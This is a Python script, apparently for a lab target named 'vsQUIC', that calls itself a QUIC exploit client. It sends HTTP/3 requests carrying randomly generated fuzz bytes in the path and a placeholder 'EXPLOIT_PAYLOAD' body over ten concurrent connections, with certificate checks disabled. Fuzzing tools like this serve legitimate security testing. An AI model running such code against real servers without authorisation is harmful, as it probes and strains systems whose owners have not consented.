import asyncio
import random
import socket
from datetime import datetime
from aioquic.quic.configuration import QuicConfiguration
from aioquic.asyncio.client import connect
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import HeadersReceived, DataReceived
from aioquic.asyncio.protocol import QuicConnectionProtocol

def generate_fuzz_payload(length=100):
    chars = list(range(0x20, 0x7F)) + [0x00, 0x0A, 0x0D]
    return bytes(random.choice(chars) for _ in range(length))

class QuicExploitClientProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._http = H3Connection(self._quic)
        self._response_waiter = asyncio.Future()

    def quic_event_received(self, event):
        if isinstance(event, (HeadersReceived, DataReceived)):
            self._http.handle_event(event)
            if isinstance(event, DataReceived) and event.stream_ended:
                if not self._response_waiter.done():
                    self._response_waiter.set_result(event.data)

class QuicExploitClient:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.configuration = QuicConfiguration(
            is_client=True,
            alpn_protocols=H3_ALPN,
            verify_mode=0,
        )

    async def send_exploit_payload(self, iteration: int):
        try:
            # Проверка доступности сервера
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    sock.settimeout(2)
                    sock.connect((self.host, self.port))
            except Exception as e:
                print(f"[{iteration}] ❌ Ошибка соединения с сервером: {str(e)}")
                return

            async with connect(
                host=self.host,
                port=self.port,
                configuration=self.configuration,
                create_protocol=QuicExploitClientProtocol,
            ) as protocol:
                connection = protocol._http
                
                headers = [
                    (b":method", b"GET"),
                    (b":path", b"/?" + generate_fuzz_payload(50)),
                    (b":authority", self.host.encode()),
                    (b":scheme", b"https"),
                    (b"user-agent", b"haCker Exploit Client"),
                ]

                stream_id = connection.send_headers(
                    headers=headers,
                    end_stream=False
                )
                connection.send_data(stream_id=stream_id, data=b"EXPLOIT_PAYLOAD", end_stream=True)

                try:
                    # Ждем ответ с таймаутом
                    response = await asyncio.wait_for(protocol._response_waiter, timeout=5.0)
                    self.analyze_response(response, iteration)
                except asyncio.TimeoutError:
                    print(f"[{iteration}] ⚠️ Timeout waiting for response")
                except Exception as e:
                    print(f"[{iteration}] ❌ Response error: {str(e)}")

        except Exception as e:
            print(f"[{iteration}] ❌ Connection error: {str(e)}")

    def analyze_response(self, response: bytes, iteration: int):
        if response:
            print(f"[{iteration}] ✅ Response ({len(response)} bytes): {response[:100]}...")
            with open("/opt/haCker_client_log.txt", "a") as f:
                f.write(f"[{datetime.now()}] Response: {response[:200]}...\n")
        else:
            print(f"[{iteration}] ❌ Empty response")

    async def run_exploit(self, threads=10):
        print(f"Запуск {threads} потоков отправки вредоносных данных...")
        tasks = [asyncio.create_task(self.send_exploit_payload(i)) for i in range(threads)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    print("Implementation QUIC Exploit Client - Отправка вредоносной нагрузки")
    print("Цель: vulnerable server QUIC aka 'vsQUIC'")
    
    client = QuicExploitClient("vsQUIC", 4433)  # Измените на нужный хост
    asyncio.run(client.run_exploit(threads=10))